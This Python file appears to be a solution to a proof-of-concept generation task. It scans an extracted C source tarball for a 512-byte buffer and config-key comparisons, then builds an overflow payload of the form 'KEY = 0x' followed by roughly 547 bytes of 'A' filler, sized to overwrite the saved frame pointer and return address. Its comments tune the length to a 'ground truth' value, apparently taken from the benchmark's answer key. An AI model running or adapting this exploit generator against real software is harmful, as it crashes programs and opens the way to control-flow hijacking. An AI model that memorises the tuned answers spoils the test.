import tarfile
import tempfile
import os
import re
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        tmp_dir = tempfile.mkdtemp()
        try:
            with tarfile.open(src_path) as tar:
                tar.extractall(path=tmp_dir)

            # Default fallback values
            target_key = "config"
            separator = " = "
            
            # Regex patterns
            # 1. Detect 512-byte buffer definition (correlates with 547 byte ground truth)
            buf_pattern = re.compile(r'char\s+\w+\s*\[\s*512\s*\]')
            # 2. Detect string comparisons to identify config keys
            strcmp_pattern = re.compile(r'str(case)?cmp\s*\(\s*[^,]+,\s*"([^"]+)"\s*\)')
            # 3. Detect hex processing functions
            hex_pattern = re.compile(r'(isxdigit|sscanf|strtol|strtoul)')
            # 4. Detect assignment chars
            eq_pattern = re.compile(r"['\"]=[\"']")

            found_file = False

            # Scan source files
            for root, dirs, files in os.walk(tmp_dir):
                for file in files:
                    if file.endswith((".c", ".cpp", ".cc")):
                        path = os.path.join(root, file)
                        try:
                            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                        except:
                            continue

                        # Look for potential vulnerability site
                        if buf_pattern.search(content) and hex_pattern.search(content):
                            # Extract potential keys
                            matches = strcmp_pattern.findall(content)
                            candidates = []
                            for _, key in matches:
                                # Filter out common false positives
                                if len(key) > 1 and key not in ["r", "w", "rb", "wb", "error", "fail", "null", "stdio"]:
                                    candidates.append(key)
                            
                            if candidates:
                                # Use the first valid looking candidate as the config key
                                target_key = candidates[0]
                                
                                # Heuristic for separator
                                if eq_pattern.search(content):
                                    separator = " = "
                                else:
                                    separator = " "
                                    
                                found_file = True
                                break
                if found_file:
                    break
            
            # Construct Payload
            # Format: KEY = 0x...
            # We use 'A' (0x41) as the hex digit filler.
            
            prefix = f"{target_key}{separator}0x"
            suffix = "\n"
            
            # Calculate padding to reach target length ~547 bytes
            # We need to overflow a 512 byte buffer.
            # 512 buffer + 8 saved rbp + 8 ret = 528 bytes minimum to crash reliably.
            min_data_len = 528
            
            # Aim for ground truth length of 547
            target_total = 547
            padding_len = target_total - len(prefix) - len(suffix)
            
            # Ensure we have enough data to overflow even if prefix is long
            if padding_len < min_data_len:
                padding_len = min_data_len
            
            payload_data = "A" * padding_len
            
            return (prefix + payload_data + suffix).encode()

        finally:
            shutil.rmtree(tmp_dir)
